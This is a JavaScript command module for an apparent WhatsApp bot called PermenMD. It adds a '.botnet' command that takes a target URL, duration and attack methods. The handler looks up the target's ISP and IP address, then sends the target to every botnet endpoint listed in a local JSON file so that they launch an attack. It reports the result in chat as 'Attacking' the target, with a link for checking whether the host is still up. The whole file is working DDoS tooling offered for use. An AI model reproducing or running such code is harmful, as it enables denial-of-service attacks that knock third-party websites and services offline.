const axios = require('axios');
const fs = require('fs');
const path = require('path');
const url = require('url');

async function PermenMDBotnet(endpoints, target, duration, methods) {
    let successCount = 0;

    for (const endpoint of endpoints) {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;
        try {const response = await axios.get(apiUrl);if (response.status === 200) {successCount++;}
            } catch (error) {console.error(`Error sending request to ${endpoint}: ${error.message}`);}}

    return successCount;
}

const handler = async (m, { conn, args }) => {
  if (args.length < 3) return conn.reply(m.chat, '```\n[🔎] .botnet [target] [duration] [methods]\n```', m);

    m.reply(`Wait A Seconds...`)
  const [target, duration, methods] = args;
  const parsedUrl = new url.URL(target);

  const hostname = parsedUrl.hostname;
  const path = parsedUrl.pathname;
  const thumb = global.brutall;

  const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
  const result = response.data;

  const deepinfo = `\`Hostname: ${hostname}\`\n\`Path: ${path}\`\n\`Isp: ${result.isp}\`\n\`Ip: ${result.query}\`\n\`AS: ${result.as}\``;
  const botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
  const endpoints = botnetData.endpoints;

const successCount = await PermenMDBotnet(endpoints, target, duration, methods);
await conn.sendMessage(m.chat, {
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        title: `Attacking ${target}`,
        body: `Check Host Click Me`,
        mediaType: 1,
        renderLargerThumbnail: true,
        thumbnailUrl: thumb,
        sourceUrl: `https://check-host.net/check-http?host=${target}`
      }
    },
    text: `│ Botnet Online: ${successCount}\nCreator: PermenMD\n│ Target: ${target}\n│ Methods: ${methods}\n│ Duration: ${duration}\n${deepinfo}`
  }, { quoted: m });

};

handler.help = ['botnet'].map(v => v + ' <target> <duration> <methods>');
handler.tags = ['tools', 'attack'];
handler.owner = true;
handler.command = /^(botnet)$/i;
module.exports = handler;
